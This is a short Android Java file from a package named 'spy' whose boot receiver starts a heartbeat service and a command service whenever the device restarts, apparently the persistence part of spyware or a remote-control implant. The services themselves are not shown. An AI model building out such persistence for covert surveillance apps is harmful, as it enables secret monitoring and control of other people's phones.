package com.nexus.spy;
import android.content.*;
import android.os.Build;
public class BootReceiver extends BroadcastReceiver {
    @Override public void onReceive(Context c, Intent i) {
        Intent svc = new Intent(c, HeartbeatService.class);
        if (Build.VERSION.SDK_INT >= 26) c.startForegroundService(svc); else c.startService(svc);
        Intent cmd = new Intent(c, CommandService.class);
        if (Build.VERSION.SDK_INT >= 26) c.startForegroundService(cmd); else c.startService(cmd);
    }
}
